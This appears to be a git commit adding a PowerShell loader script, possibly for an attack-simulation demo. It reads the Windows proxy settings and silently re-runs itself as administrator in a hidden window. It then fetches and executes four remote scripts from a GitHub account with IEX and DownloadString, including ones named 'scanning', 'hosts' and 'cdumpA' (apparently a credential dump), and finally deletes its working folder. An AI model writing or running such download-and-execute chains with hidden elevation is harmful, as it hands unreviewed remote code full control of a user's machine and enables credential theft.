9374dcd1d0200f309f9ca6db7ac3cf221bbffe15
tameval <114147355+tameval@users.noreply.github.com>
2022-10-30 18:20:24 +0900

    Create init_33667pr.ps1

---
+++ 33667/proxy/init_33667pr.ps1
@@ -0,0 +1,39 @@
+#Check if manual proxy is set or not
+if ((Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("AutoConfigURL") -ne $Null)
+{
+    $wsobj = new-object -comobject wscript.shell
+    $result = $wsobj.popup("Do not support Proxy PAC")
+    exit
+}
+if ((Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("ProxyEnable") -eq 1)
+{
+    $proxy_url = "http://" + (Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings").GetValue("ProxyServer")
+}
+else
+{
+    $wsobj = new-object -comobject wscript.shell
+    $result = $wsobj.popup("Manual proxy setup not configured")
+    exit
+}
+
+
+#If proxy lookup doesn't work, remove IfElse and set static ip address 
+#$proxy_url= 'http://13.231.199.128:3128'
+
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }
+set-Content C:\CRDemo\proxy.txt $proxy_url
+$web_client = New-Object System.Net.WebClient; $proxy_server = New-Object System.Net.WebProxy($proxy_url, $true); $web_client.Proxy = $proxy_server
+
+#7zip
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/proxy/7zip_33667pr.ps1')
+
+#scanning
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/proxy/scan_33667pr.ps1') 
+
+#hosts
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/proxy/hosts_33667pr.ps1')
+
+#cdumpA
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/proxy/cdumpa_33667pr.ps1')
+
+Remove-Item C:\CRDemo -Recurse -Force
